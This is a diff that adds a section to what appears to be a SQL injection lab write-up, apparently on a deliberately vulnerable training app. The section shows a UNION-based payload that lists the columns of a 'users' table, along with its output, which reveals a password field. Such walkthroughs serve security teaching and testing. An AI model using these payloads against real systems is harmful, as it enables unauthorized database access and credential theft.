@@ -82,3 +82,51 @@ test2' AND 1=0 UNION SELECT NULL, table_name FROM information_schema.tables #
 Successfully extracted table names from `information_schema.tables`.
 
 ---
+## Enumerating Columns from `users` Table
+
+Used the following payload to list column names:
+
+```sql
+sparklekitten' AND 1=0 UNION SELECT NULL, concat(table_name,0x0a,column_name) 
+FROM information_schema.columns WHERE table_name = 'users' #
+```
+
+Output revealed:
+
+```
+ID: sparklekitten' AND 1=0 UNION SELECT NULL, concat(table_name,0x0a,column_name) FROM information_schema.columns WHERE table_name = 'users' #
+First name: 
+Surname: users
+user_id
+
+First name: 
+Surname: users
+first_name
+First name: 
+Surname: users
+last_name
+
+First name: 
+Surname: users
+user
+
+First name: 
+Surname: users
+password
+
+First name: 
+Surname: users
+avatar
+
+First name: 
+Surname: users
+last_login
+
+First name: 
+Surname: users
+failed_login
+```
+
+Confirmed that `password` and other useful fields exist in the `users` table.
+
+---
